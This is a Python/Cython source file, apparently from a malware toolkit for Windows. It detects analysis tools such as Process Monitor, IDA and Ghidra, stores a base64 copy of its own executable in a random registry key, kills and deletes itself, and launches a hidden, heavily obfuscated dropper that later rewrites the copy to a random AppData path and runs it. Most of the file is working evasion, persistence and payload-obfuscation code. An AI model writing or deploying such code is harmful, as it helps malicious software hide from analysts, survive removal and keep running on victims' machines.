import os
import time
import psutil
from base64 import b64encode
from codecs import encode
from zlib import compress
from random import choice,randrange
import signal,atexit
from marshal import loads,dumps
from os import urandom
from Utils.helpers import get_current_file_path,run_detached_process,\
    find_python_path,random_string,base64_encode_file,setRegistryKey,TypicalRegistryKey
cdef list debug_process = ['procexp', 'procmon' 'autoruns', 'processhacker', 'ida', 'ghidra']
hide = 0
cpdef bint find_debug_process():
    """we return true if we found any debug process exists, else false"""
    for debug_proc in debug_process:
        for process in psutil.process_iter():
            if debug_proc in process.name().lower():
                return True
    return False


def remove_on_exit():
    os.remove(get_current_file_path())
    print('removing')
    raise SystemExit()

def process_monitor():
    """
    we didn't cpde'ed this because closures aren't supported in cython
    really simple, this function run as thread in the background.
    if we find any debug process, we are doing the next steps:
    1. we create random key in the registry with value being our base64 code of the current exe(persistence)
    2. we create plain python code with specific injected values to run from the cli
    3. this code will silently monitor until condition's are met
    4. when the condition's are met, the cli code will load the base64 from the registry
       it will base64 decode it, create a exe in random location with random name, and launch it
       the exe that got launched is PURE copy of our own code, so it will also avoid debug in the same way.
      """
    python_path = find_python_path()
    if 'program' in python_path.lower() and 'appdata' not in python_path.lower():
        python_path = f'"{python_path}"'
    random_locations = [f"c:/users/{os.getlogin()}/appdata/local/temp/",
                        f"c:/users/{os.getlogin()}/appdata/local/programs/",
                        f"c:/users/{os.getlogin()}/appdata/LocalLow/",
                       f"c:/users/{os.getlogin()}/appdata/Roaming/"]
    if python_path:
        print(f'{python_path} -m pip install psutil')
        install_psutil = run_detached_process(f'{python_path} -m pip install psutil')
    while True:
        time.sleep(5)
        if any(debug_proc in process.name().lower() or process.name().lower() in debug_proc for debug_proc in debug_process for process in psutil.process_iter()):
            print('debug process handler')
            if not find_python_path():
                os.kill(os.getpid(), signal.SIGTERM)
                return True

            current_file = get_current_file_path()
            our_pid = os.getpid()
            random_location = os.path.join(choice(random_locations), random_string(is_random=True,is_exe=True))
            our_source = base64_encode_file(current_file)
            our_reg_key = random_string(is_random=True)
            setRegistryKey(registry_path=TypicalRegistryKey,key_name=our_reg_key,value=our_source)
            print('random here',current_file,random_location)
            our_code = b64encode(f"""
from shutil import copyfile
import psutil
import os
import time
import signal
from base64 import b64decode
import winreg
reg_path = f"{TypicalRegistryKey}"
reg_key = f"{our_reg_key}"
debug_process = ['procexp', 'procmon' 'autoruns', 'processhacker', 'ida', 'ghidra']
try:
    p = psutil.Process({our_pid})
    p.kill()
except Exception as e:
    pass
try:
    os.kill({our_pid},signal.SIGTERM)
except Exception as e:
    pass
try:
    os.remove(r'{current_file}')
except Exception as e:
    pass
while True:
       if any(debug_proc in process.name().lower() or process.name().lower() in debug_proc for debug_proc in debug_process for process in psutil.process_iter()):
          time.sleep(5)
       else:
          break
try:
    registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0,
                                       winreg.KEY_READ)
    value, regtype = winreg.QueryValueEx(registry_key, reg_key)
    winreg.CloseKey(registry_key)
    with open('{random_location}','wb') as file:
        file.write(b64decode(value))
except WindowsError:
    pass
os.system('{random_location}')
""".encode()).decode()
            command_to_run = f"""from ctypes import windll;from base64 import b64decode;windll.user32.ShowWindow(windll.kernel32.GetConsoleWindow(), {hide});exec(b64decode('{our_code}'))"""
            #command_to_run = f"""
            #from base64 import b64decode;exec(b64decode('{our_code}'))
             #           """
            print(f"compiling command_to_run")
            compiled_sub_dropper = compile(command_to_run,'<string>','exec')
            marshal_bytes = dumps(compiled_sub_dropper)
            reversed_bytes = marshal_bytes[::-1]
            urandom_atstart = randrange(128, 512)
            #urandom_atend = randrange(128, 512)
            noise = urandom(urandom_atstart) + reversed_bytes
            bytes_sub_dropper = f"""from marshal import loads;code={noise};decoded_code=exec(loads(code[{urandom_atstart}:][::-1]))"""
            main_dropper_bytes = dumps(compile(bytes_sub_dropper,'<string>','exec')) #bytes
            base64main_dropper = b64encode(main_dropper_bytes).decode() #str
            rot_first13_dropper = encode(base64main_dropper,'rot13') #str
            reversed_main_dropper = rot_first13_dropper[::-1] #str
            rot_13_main_dropper = encode(reversed_main_dropper,'rot13') #str
            compressed_main_dropper = compress(rot_13_main_dropper.encode(),level=9) #bytes
            another_b64_main_dropper = b64encode(compressed_main_dropper).decode()
            another_rot13_main = encode(another_b64_main_dropper,'rot13')
            dropper = (
                 f'from base64 import b64decode;from codecs import encode;from zlib import decompress;from marshal import loads;\n'
                 f'code = """{another_rot13_main}""";\n'
                 f'code = encode(code,\'rot13\');\n'
                 f'code = b64decode(code);\n'
                f'code = decompress(code).decode();\n'
                 f'code = encode(code,\'rot13\');\n'
                 f'code = code[::-1];\n'
                 f'code = encode(code,\'rot13\');\n'
                 f'code = b64decode(code);\n'
                 f'exec(loads(code));\n')
            end_dropper = b64encode(dropper.encode()).decode()
            end_code = f'from ctypes import windll;from base64 import b64decode;windll.user32.ShowWindow(windll.kernel32.GetConsoleWindow(), {hide});exec(b64decode("""{end_dropper}"""))'
            done = f"from base64 import b64decode;from ctypes import windll;windll.user32.ShowWindow(windll.kernel32.GetConsoleWindow(), {hide});exec(b64decode('{b64encode(end_code.encode()).decode()}'))"
            print(f"""{python_path} -c "{done}"  """)
            ourCommand = run_detached_process(f"""{python_path} -c "{done}"  """)
            return True
atexit.register(remove_on_exit)